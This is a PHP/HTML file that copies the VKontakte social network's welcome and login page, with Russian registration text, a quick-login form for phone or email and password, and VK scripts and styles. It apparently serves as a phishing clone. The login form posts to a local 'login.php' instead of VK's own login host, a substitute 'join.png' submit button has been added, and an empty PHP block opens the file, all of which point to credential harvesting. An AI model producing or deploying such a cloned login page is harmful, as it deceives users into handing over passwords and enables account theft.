<?php

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">

<head>
<style>
.button_blue button,
.button_blue button, .button_blue.button_disabled button:active, .button_blue.button_disabled button.active, .button_blue.button_disabled button:hover, .button_blue.button_disabled button.hover {
    padding: 6px 16px;
    border-width: 0px 0px 1px;
    border-style: none none solid;
    border-color: -moz-use-text-color -moz-use-text-color #496B93;
    -moz-border-top-colors: none;
    -moz-border-right-colors: none;
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    border-image: none;
    text-shadow: 0px 1px 0px #5578A0;
    background: url('/images/button_bgf.png?1') repeat-x scroll 0px -12px #658AB0;
    color: #FFF;
}
</style>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<script type="text/javascript" src="http://vkontakte.ru/js/loader_nav6142_0.js"></script>

<link rel="shortcut icon" href="http://vkontakte.ru/images/faviconnew.ico" />

<meta http-equiv="content-type" content="text/html; charset=windows-1251" />
<meta name="description" content="<b>ВКонтакте</b>  – универсальное средство для общения и поиска друзей и одноклассников,<br>
которым ежедневно пользуются десятки миллионов человек.." />

<title>Добро пожаловать</title>

<noscript><meta http-equiv="refresh" content="0; URL=/badbrowser.php"></noscript>

<link rel="stylesheet" type="text/css" href="http://vkontakte.ru/css/al/common.css?217" />
<!--[if lte IE 6]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(http://vkontakte.ru//css/al/ie6.css?19); /* ]]> */</style><![endif]-->
<!--[if IE 7]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(http://vkontakte.ru//css/al/ie7.css?13); /* ]]> */</style><![endif]-->

<script type="text/javascript">
var vk = {
  ad: 1,
  adupd: 120000, // 2 min
  al: parseInt('4') || 4,
  id: 0,
  intnat: '' ? true : false,
  host: 'vkontakte.ru',
  lang: 0,
  rtl: parseInt('') || 0,
  version: 6142,
  zero: false,
  contlen: 6343,
  loginscheme: 'https',
  ip_h: 'd35c59d42665369744',
  navPrefix: '/',
  dt: parseInt('') || 0,
  time: [2011, 11, 14, 14, 8]
}

window.locDomain = vk.host.match(/[a-zA-Z]+\.[a-zA-Z]+\.?$/)[0];
var _ua = navigator.userAgent.toLowerCase();
if (/opera/i.test(_ua) || !/msie 6/i.test(_ua) || document.domain != locDomain) document.domain = locDomain;
var ___htest = (location.toString().match(/#(.*)/) || {})[1] || '';
if (vk.al != 1 && ___htest.length && ___htest.substr(0, 1) == vk.navPrefix) {
  if (vk.al != 3 || vk.navPrefix != '!') {
    location.replace(location.protocol + '//' + location.host + '/' + ___htest.replace(/^(\/|!)/, ''));
  }
}

var StaticFiles = {
  'common.js' : {v: 603},
  'common.css': {v: 217},
  'ie6.css'   : {v: 19},
  'ie7.css'   : {v: 13}
  ,'lang0_0.js':{v:4934},'index.css':{v:6},'index.js':{v:13}
}

</script>
<link type="text/css" rel="stylesheet" href="http://vkontakte.ru/css/al/index.css?6"></link><script type="text/javascript" src="http://vkontakte.ru/js/al/common.js?603"></script><script type="text/javascript" src="http://vkontakte.ru/js/lang0_0.js?4934"></script><style>
#page_layout {width: 791px;}
#page_body {width: 631px;}
#footer_wrap {width: 661px;}
</style><script type="text/javascript" src="http://vkontakte.ru/js/al/index.js?13"></script>

</head>

<body onresize="onBodyResize()" class="is_rtl">
  <div id="system_msg" class="fixed"></div>
  <div id="utils"></div>

  <div id="layer_bg" class="fixed"></div><div id="layer_wrap" class="scroll_fix_wrap fixed"><div id="layer"></div></div>
  <div id="box_layer_bg" class="fixed"></div><div id="box_layer_wrap" class="scroll_fix_wrap fixed"><div id="box_layer"><div id="box_loader"><div class="loader"></div><div class="back"></div></div></div></div>

  <div id="stl_left"></div><div id="stl_side"></div>

  <script type="text/javascript">domStarted();</script>

  <div class="scroll_fix_wrap" id="page_wrap">
<div><div class="scroll_fix">
  <div id="page_layout">
    <div id="page_header" class="p_head p_head_l0">
      <div class="back"></div>
      <div class="left"></div>
      <div class="right"></div>
      <div class="content">
        <div id="top_nav" class="head_nav">
  <a id="top_home_link" class="top_home_link fl_l" href="http://vkontakte.ru/" onclick="return nav.go(this, event)" class="fl_l" style=""></a>
  <div id="top_links">
    <a id="top_reg_link" class="fl_r top_nav_link" href="http://vkontakte.ru/reg0" style="display: none" onclick="return !showBox('al_register.php', {act: 'register_box'}, {params: {width: 514}, stat: ['reg.css']}, event)">Как стать участником?</a>
    <a id="top_search_link" class="fl_r top_nav_link" href="http://vkontakte.ru/search" style="" onclick="return nav.go(this, event)">
Switch to English </a>
    <a class="fl_l top_nav_link" href="http://vkontakte.ru/" id="top_back_link" onclick="return nav.go(this, event, {back: true})"></a>
  </div>
</div>
      </div>
    </div>

    <div id="side_bar" class="fl_l" style="">
      <div id="quick_login">
  <form method="POST" name="login" id="quick_login_form" action="login.php" >
    <input type="hidden" name="act" value="login" />
    <input type="hidden" name="q" value="1" />
    <input type="hidden" name="al_frame" value="1" />
    <input type="hidden" name="expire" id="quick_expire_input" value="" />
    <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="" />
    <input type="hidden" name="captcha_key" id="quick_captcha_key" value="" />
    <input type="hidden" name="from_host" value="vkontakte.ru" />
    <input type="hidden" name="ip_h" value="d35c59d42665369744" />
    <div class="label">
Телефон или email</div>
    <div class="labeled"><input type="text" name="email" class="text" onfocus="show('quick_expire')" id="quick_email" /></div>
    <div class="label">Пароль</div>
    <div class="labeled"><input type="password" name="pass" class="text" onfocus="show('quick_expire')" id="quick_pass" /></div>
    
    <input type="image" src="join.png">
 <div class="button_blue button_wide button_big" id="quick_reg_button" style="display: none"><button onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button></div>
  <div class="clear forgot"><a id="quick_forgot" href="/restore" target="_top">Забыли пароль?</a><br><br><div class="checkbox ta_l" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';"><div></div>Чужой компьютер</div></div>



</form>
  

  
</div>
    </div>

    <div id="page_body" class="fl_r">
      <div id="header_wrap2">
        <div id="header_wrap1">
          <div id="header" style="">
            <h1 id="title">Добро пожаловать</h1>
          </div>
        </div>
      </div>
      <div id="wrap_between"></div>
      <div id="wrap3"><div id="wrap2">
  <div id="wrap1">
    <div id="content"><div id="index">
  <iframe class="upload_frame" src="https://login.vk.com/?role=al_frame&_origin=http://vk.com&ip_h=3b50bf1e74a47f9f5e"></iframe>
  <div class="content">
    <p><b>ВКонтакте</b> – универсальное средство для общения и поиска друзей и одноклассников,<br>которым ежедневно пользуются десятки миллионов человек.</p>

    <h2>Моментальная регистрация</h2>
<div class="msg" id="ij_msg"></div>

    <div class="ij_form">
      <div class="ij_reg_row">
        <input type="text" class="big_text" id="ij_first_name" value="" placeholder="Ваше имя" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();" />
      </div>
      <div class="ij_reg_row">
        <input type="text" class="big_text" id="ij_last_name" value="" placeholder="Ваша фамилия" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();" />
      </div>
      <div class="ij_reg_row" id="ij_sex_row">
        <input type="hidden" id="ij_sex" name="ij_sex" />
      </div>
      <div class="button_blue button_wide button_big ij_button">
        <button id="ij_submit" onclick="Index.submitJoinStart()">
          <span class="ij_with_arr">Зарегистрироваться</span>
        </button>
      </div>
      <div id="index_fbsign">
        <div class="index_fbb">
          <div class="index_or"><div class="index_or_l"></div><span class="index_or_s">или</span></div>
          <div class="button_blue button_wide button_big ij_button index_fb_btn">
            <button id="index_fb" onclick="Index.fbJoin();">
              <div class="index_fb_logo"></div>
              <div class="index_fb_l">Войти через Facebook</div>
            </button>
          </div>
        </div>
      </div>
    </div>

    <h2>В чём поможет ВКонтакте?</h2>
    <ul class="listing">
      <li><span>Найти людей, с которыми Вы когда-либо учились, работали или отдыхали.</span></li>
      <li><span>Узнать больше о людях, которые Вас окружают, и найти новых друзей.</span></li>
      <li><span>Всегда оставаться в контакте с теми, кто Вам дорог.</span></li>
    </ul>
  </div>
  <div class="reg">
    <table cellspacing="0" cellpadding="0" id="ij_screens"><tr>
      <td><a class="ij_scr" onclick="JoinPhotoview.show(0)"><img src="http://vk.com/images/join/prof_m.png?4" class="ijs_img" /></a></td>
      <td><a class="ij_scr" onclick="JoinPhotoview.show(1)"><img src="http://vk.com/images/join/news_m.png?4" class="ijs_img" /></a></td>
      <td><a class="ij_scr" onclick="JoinPhotoview.show(2)"><img src="http://vk.com/images/join/dial_m.png?4" class="ijs_img" /></a></td>
    </tr></table>
  </div>
</div></div>
  </div>
</div></div>
    </div>

   <div id="footer_wrap" class="fl_r" style="width: 661px;">
      <div id="bottom_nav">
  <a class="bnav_a" href="/about">о сайте</a>
  <a class="bnav_a" href="/support?act=new" onclick="return nav.go(this, event);" style="display: none;">помощь</a>
  <a class="bnav_a" href="/terms">правила</a>
  <a class="bnav_a" href="/ads">реклама</a>
  <a class="bnav_a" href="/people">люди</a><a class="bnav_a" href="/communities">сообщества</a>
  <a class="bnav_a" href="/dev">разработчикам</a>
  <a class="bnav_a" href="/jobs" style="display: none;">вакансии</a>
</div>
<div id="footer" class="clear">
  <div class="copy_lang"><a href="/about">ВКонтакте</a> &copy; 2014 <a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: 'd4152b7f26df67c6f6'})">English</a><a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: 'd4152b7f26df67c6f6'})">Русский</a><a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: 'd4152b7f26df67c6f6'})">Українська</a><a class="bnav_lang" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки &raquo;</a></div>
  
  <div>
    
    
  </div>
</div>
    </div>
    <div class="clear"></div>
  </div>
</div></div></div>
  <div class="progress" id="global_prg"></div>

  <script type="text/javascript">
    if (parent && parent != window && (browser.msie || browser.opera || browser.mozilla || browser.chrome || browser.safari || browser.iphone)) {
      document.getElementsByTagName('body')[0].innerHTML = '';
    } else {
      domReady();
      updateMoney(0);
gSearch.init();
if (window.qArr && qArr[5]) qArr[5] = [5, "по товарам", "", "goods", 0x00000100];var qf = ge('quick_login_form'), ql = ge('quick_login'), qe = ge('quick_email'), qp = ge('quick_pass');
var qlb = ge('quick_login_button');

window.onload = function() {
  setTimeout(function() {
    ql.insertBefore(ce('div', {innerHTML: '<iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"></iframe>'}), qf);
    qf.target = 'quick_login_frame';
  }, 1);
}

qf.onsubmit = function() {
  if (!ge('quick_login_frame')) return false;
  if (!trim(qe.value)) {
    elfocus(qe);
    return false;
  } else if (!trim(qp.value)) {
    elfocus(qp);
    return false;
  }
  lockButton(qlb);
  return true;
}

window.focusLoginInput = function() {
  scrollToTop(0);
  notaBene('quick_email');
}
window.changeQuickRegButton = function(noShow) {
  if (noShow) {
    hide('top_reg_link');
    show('top_search_link');
  } else {
    hide('top_search_link');
    show('top_reg_link');
  }
}
window.submitQuickLoginForm = function(email, pass) {
  ge('quick_email').value = email;
  ge('quick_pass').value = pass;
  if (qf.onsubmit()) qf.submit();
}

if (qlb) {
  qlb.onclick = function() { if (qf.onsubmit()) qf.submit(); };
}

if (browser.opera_mobile) show('quick_expire');
extend(cur, {
  jpvOnHide: elfocus.pbind('ijp_input'),
  hash: '3fa5a4225d08185475'
});
if (isVisible('ij_block')) {
  showBackLink('/', 'Главная страница');
  elfocus('ijp_input');
}JoinPhotoview.init([{"src":"\/images\/join\/dial_1.png?1","width":790,"height":600,"desc":"Общайтесь с близкими людьми при помощи личных сообщений"},{"src":"\/images\/join\/news_1.png?1","width":790,"height":600,"desc":"Получайте новости из жизни Ваших друзей и известных людей"},{"src":"\/images\/join\/photos_1.png?1","width":790,"height":600,"desc":"Делитесь фотографиями с событий из Вашей жизни с друзьями"}]);
cur.lang = extend(cur.lang || {}, {
  index_screen_m_of_n: 'Иллюстрация {num} из {count}',
  index_to_main: 'Главная страница'
});
Index.init();
var login = ge('quick_email');
if (login) {
  login.focus();
}
if (1) {
  hide('support_link_td');
}
var ts_input = ge('ts_input'), oldFF = browser.mozilla && parseInt(browser.version) < 8;
if (browser.mozilla && !oldFF) {
  setStyle(ts_input, {padding: '3px 4px 4px 22px'});
}
placeholderSetup(ts_input, {back: false, reload: true});
if (browser.opera || browser.msie || oldFF) {
  setStyle(ts_input, {padding: '3px 4px 4px 22px'});
}
if (browser.chrome) {
  setStyle(ts_input, {padding: '4px 3px 3px 23px'});
}
TopSearch.init();
if (browser.msie8) {
  setStyle(ge('ts_cont_wrap'), {border: '1px solid #a6b6c6', right: '1px'});
}
handlePageParams({"id":0,"loc":"","width":791,"width_dec":160,"width_dec_footer":130});addEvent(document, 'click', onDocumentClick);
    }
  </script>
</body>

</html>
